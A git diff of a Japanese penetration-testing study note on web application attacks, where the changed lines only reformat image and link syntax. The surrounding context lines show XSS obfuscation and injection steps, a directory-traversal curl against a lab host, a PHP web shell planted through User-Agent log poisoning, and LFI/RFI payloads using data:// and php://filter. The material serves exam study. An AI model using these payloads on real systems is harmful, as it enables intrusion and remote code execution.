@@ -31,8 +31,8 @@
 	- 使われている技術が直接脆弱性につながるわけではないが、バージョンによっては重大な脆弱性が隠れていることがある
 
 - ==すべてのリンク、アクセス可能なサイト、ボタン、ソースコードをよく観察すること==
-	- [Module 8 x Module 9： Web Application Attacks](Module%208%20x%20Module%209：%20Web%20Application%20Attacks.md#リンクから得られる情報例)
-![[Pasted image 20250322134733.png]]
+	- [Module 8 x Module 9： Web Application Attacks](#リンクから得られる情報例)
+![](../画像ファイル/Pasted%20image%2020250322134733.png)
 
 ### リンクから得られる情報例
 
@@ -117,12 +117,12 @@ ajaxRequest.send(params);
 
 4. [Web攻撃の難読化](../Cheatsheet/Stealth&Evasion/Web攻撃の難読化.md)のJS: CharCodeAt()に従い難読化する。
 5. 難読化したスクリプトをBurpSuiteを用いてXSSに脆弱な箇所に埋め込み、ルートディレクトリへGETリクエストをSend（`<script></script>`で囲む）
-![[Pasted image 20250321200240.png]]
+![](../画像ファイル/Pasted%20image%2020250321200240.png)
 
 6. ステップ1に記載の通り、Visitorsプラグインを閲覧し、user-agentが何も記載されていないことを確認できれば成功
-![[Pasted image 20250320123601.png]]
+![](../画像ファイル/Pasted%20image%2020250320123601.png)
 
-![[Pasted image 20250320123617.png]]
+![](../画像ファイル/Pasted%20image%2020250320123617.png)
 
 
 ---
@@ -173,7 +173,7 @@ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../.
 ```php
 <?php echo system($_GET['cmd']); ?>
 ```
-![[Pasted image 20250322224544.png]]
+![](../画像ファイル/Pasted%20image%2020250322224544.png)
 $$User-Agentにペイロードを注入$$
 
 3. ステップ２でWeb shellペイロードがログファイルに記録されているかどうかを確認するため、プロセスを閲覧する（URL encodeすること）
@@ -207,7 +207,7 @@ http://example.com/index.php?page=admin.php
 ```
 
 2. Burp Suiteでファイルを実行した結果を閲覧する。このとき、`<body>` などのタグが閉じられていないなど、不自然なコードがないかを探す。
-![[Pasted image 20250329113419.png]]
+![](../画像ファイル/Pasted%20image%2020250329113419.png)
 
 3. `php://filter` wrapperを使用してファイルの中身を表示する。もし、ステップ２と結果が変わらない場合は次のステップに進む
 ```
@@ -276,7 +276,7 @@ GET /index.php?page=data://text/plain;base64,<base64_encoded_php_code>&cmd=ls"
 #### RFIの概要
 
 - 用途：LFIとほぼ同じ。異なるのは、HTTP1やSMB2を介して<u>リモートシステム</u>(攻撃者のホストするサーバ等)からファイルをインクルード可能なところ
-- シチュエーション・使い方：LFIと同じ → [Module 8 x Module 9： Web Application Attacks](Module%208%20x%20Module%209：%20Web%20Application%20Attacks.md#LFI%20x%20ログポイズニング)
+- シチュエーション・使い方：LFIと同じ → [Module 8 x Module 9： Web Application Attacks](#LFI%20x%20ログポイズニング)
 - ⚠️注意：PHPの[`allow_url_include`]([https://www.php.net/manual/en/filesystem.configuration.php](https://www.php.net/manual/en/filesystem.configuration.php))が有効でないと使えない（デフォルト無効）
 
 #### RFI実行手順
